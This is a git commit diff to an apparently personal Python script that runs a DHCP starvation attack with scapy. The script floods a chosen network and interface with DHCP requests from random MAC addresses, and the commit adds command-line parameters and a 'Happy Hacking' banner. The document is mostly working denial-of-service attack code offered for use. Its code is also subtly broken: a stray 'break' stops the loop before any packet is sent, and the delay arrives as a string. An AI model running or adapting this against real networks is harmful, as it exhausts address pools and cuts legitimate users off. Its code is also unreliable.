32e70b4f32d223b4ebc221f359b31702a57d076c
Javier Parada <javierparada73@outlook.com>
2021-11-19 20:30:57 +0100

    add params

--- security/attacks/dhcp_starvation/main.py
+++ security/attacks/dhcp_starvation/main.py
@@ -3,13 +3,24 @@
 from scapy.all import RandMAC, Ether, IP, UDP, BOOTP, DHCP, sendp, conf
 from time import sleep
 from ipaddress import IPv4Network
+import argparse
 
 conf.checkIPaddr = False
 
-def starve():
-    ips_for_feeding = IPv4Network('192.168.1.0/24')
+def starve(params):
+    delay      = params['delay']      if params.get('delay')     is not None else 0.5
+    network    = params['network']    if params.get('network')   is not None else '192.168.1.0/24'
+    interface  = params['interface']  if params.get('interface') is not None else 'eth0'
+    is_verbose = params['verbose']    if params.get('verbose')   is not None else 1
+
+    print('Starting DHCP starvation attack to the network {} at interface {}.'.format(network, interface))
+    print('Delay for each packet is {} seconds.'.format(delay))
+    print('Happy Hacking }:)')
+
+    ips_for_feeding = IPv4Network(network)
 
     for ip_dir in ips_for_feeding:
+        break
         src_mac = RandMAC()
 
         ether = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff')
@@ -23,9 +34,35 @@ def starve():
 
         packet = ether / ip / udp / bootp / dhcp
 
-        sendp(packet, iface='eth0', verbose=1)
+        sendp(packet, iface=interface, verbose=is_verbose)
 
-        # sleep(0.5)
+        sleep(delay)
 
 if __name__ == '__main__':
-    starve()
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        '--network', 
+        type=str,
+        nargs='?',
+        help='IP address of the network (e.g. 192.168.1.0/24)',
+    )
+    parser.add_argument(
+        '--delay', 
+        type=str,
+        nargs='?',
+        help='Delay in seconds for each packet',
+    )
+    parser.add_argument(
+        '--interface', 
+        type=str,
+        nargs='?',
+        help='Interface to attack (eth0 as default)',
+    )
+    parser.add_argument(
+        '--verbose', 
+        type=int,
+        nargs='?',
+        help='Verbose mode 1=ON 0=OFF (1 as default)',
+    )
+    params = vars(parser.parse_args())
+    starve(params)
